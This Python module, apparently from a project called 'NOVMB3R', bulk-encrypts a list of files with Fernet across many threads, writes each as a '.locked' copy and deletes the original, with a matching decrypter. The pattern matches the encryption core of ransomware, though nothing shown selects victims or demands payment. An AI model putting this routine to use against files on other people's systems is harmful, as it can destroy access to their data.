#  _   _  _____     ____  __ ____ _____ ____
# | \ | |/ _ \ \   / /  \/  | __ )___ /|  _ \
# |  \| | | | \ \ / /| |\/| |  _ \ |_ \| |_) |
# | |\  | |_| |\ V / | |  | | |_) |__) |  _ <
# |_| \_|\___/  \_/  |_|  |_|____/____/|_| \_\
#
# Copyright (c) 2024-2025 Daniel Lima
#
# Licensed under the MIT License.
# See the LICENSE file in the project root for full license text.
"""Provides functionality to encrypt and decrypt files using Fernet symmetric encryption."""

import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import DEFAULT_BUFFER_SIZE, BufferedReader, BufferedWriter
from pathlib import Path

from cryptography.fernet import Fernet

MAX_WORKERS = min(32, (os.cpu_count() or 1) * 4)

BYTERODER = "big"


class Encrypter:
    def __init__(self, files: list[Path], fernet: Fernet):
        self.files = files
        self.fernet = fernet

    def _encrypt_stream(
        self,
        input: BufferedReader,
        output: BufferedWriter,
        buff: int = DEFAULT_BUFFER_SIZE,
    ):
        while chunk := input.read(buff):
            enc = self.fernet.encrypt(chunk)
            output.write(len(enc).to_bytes(4, BYTERODER))
            output.write(enc)

    def encrypt_file(self, file: Path, suffix: str = ".locked"):
        dest = file.parent / (file.name + suffix)
        try:
            with open(file, "rb") as f_in, open(dest, "wb") as f_out:
                self._encrypt_stream(f_in, f_out)
            file.unlink()
        except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
            print(f"Skipping: {file}: {e}")

    def encrypt(self):
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(self.encrypt_file, file) for file in self.files]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error: {e}")


class Decrypter:
    def __init__(self, files: list[Path], fernet: Fernet):
        self.files = files
        self.fernet = fernet

    def _decrypt_stream(
        self,
        input: BufferedReader,
        output: BufferedWriter,
        buff: int = DEFAULT_BUFFER_SIZE,
    ):
        while 1:
            size_bytes = input.read(4)
            if not size_bytes:
                break  # EOF

            size = int.from_bytes(size_bytes, BYTERODER)
            chunk = input.read(size)
            if len(chunk) != size:
                raise ValueError(
                    f"Corrupted File: expected {size} bytes, got {len(chunk)}"
                )
            dec = self.fernet.decrypt(chunk)
            output.write(dec)

    def decrypt_file(self, file: Path):
        dest = file.with_name(file.name.removesuffix(".locked"))
        try:
            with open(file, "rb") as f_in, open(dest, "wb") as f_out:
                self._decrypt_stream(f_in, f_out)
        except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
            print(f"Skipping: {file}: {e}")

    def decrypt(self):
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(self.decrypt_file, file) for file in self.files]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error: {e}")
